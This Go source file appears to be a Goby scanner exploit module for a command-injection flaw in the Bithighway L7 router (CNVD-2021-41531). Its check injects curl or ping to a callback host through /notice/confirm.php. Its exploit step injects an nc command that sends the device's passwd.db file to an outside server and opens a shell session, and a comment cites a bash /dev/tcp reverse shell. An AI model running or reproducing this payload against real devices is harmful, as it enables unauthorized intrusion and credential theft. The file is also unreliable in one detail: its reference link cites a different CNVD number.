package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"log"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Bithighway L7 RCE (CNVD-2021-41531)",
    "Description": "Bihaiwei L7 cloud router wireless operation version has command execution vulnerabilities. An attacker can use this vulnerability to gain control of the server.",
    "Product": "L7Engine",
    "Homepage": "http://www.bithighway.com/",
    "DisclosureDate": "2021-08-25",
    "Author": "1291904552@qq.com",
    "GobyQuery": "banner=\"L7Engine\"",
    "Level": "3",
    "Impact": "<p></p>",
    "Recommandation": "",
    "References": [
        "https://www.cnvd.org.cn/flaw/show/CNVD-2021-37007"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "AttackType",
            "type": "select",
            "value": "goby_shell_linux"
        }
    ],
    "ExpTips": null,
    "ScanSteps": null,
    "ExploitSteps": null,
    "Tags": [
        "rce"
    ],
    "CVEIDs": null,
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": [
            "L7Engine"
        ]
    },
    "PocId": "10220",
    "Recommendation": ""
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(4)
			checkUrl, isDomain := godclient.GetGodCheckURL(checkStr)
			cmd := "curl " + checkUrl
			if isDomain {
				cmd = "ping " + checkUrl
			}
			uri := "/notice/confirm.php?t=||"+url.QueryEscape(cmd)
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			httpclient.DoHttpRequest(u, cfg)
			return godclient.PullExists(checkStr, time.Second*15)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			if ss.Params["AttackType"].(string) == "goby_shell_linux" {
				waitSessionCh := make(chan string)
				// 第一步，要获取到反连端口 rp
				if rp, err := godclient.WaitSession("reverse_linux", waitSessionCh); err != nil || len(rp) == 0 {
					log.Println("[WARNING] godclient bind failed", err)
				} else {
					// 第二步，使用拿到的反连端口 rp 生成需要执行的命令
					// ReverseTCPByBash(rp) 返回的是 bash -i >& /dev/tcp/godserver/rp
					Serverhost := godclient.GetGodServerHost()
					fmt.Println(Serverhost)
					// 第三步，使用需要执行的命令生成 paylaod
					uri :="/notice/confirm.php?t=||nc%20"+Serverhost+"%20"+rp+url.QueryEscape(" < /usr/hls/etc/passwd.db")
					cfg := httpclient.NewGetRequestConfig(uri)
					cfg.VerifyTls =false
					cfg.Header.Store("Content-Type","application/x-www-form-urlencoded")
					go httpclient.DoHttpRequest(expResult.HostInfo, cfg)
					// 固定格式，等待目标反弹 shell，若 15 秒内没收到连接请求，认为执行失败
					select {
					case webConsleID := <-waitSessionCh:
						log.Println("[DEBUG] session created at:", webConsleID)
						if u, err := url.Parse(webConsleID); err == nil {
							expResult.Success = true
							expResult.OutputType = "html"
							sid := strings.Join(u.Query()["id"], "")
							expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
						}
					case <-time.After(time.Second * 15):
					}
				}
			}
			return expResult
		},
	))
}


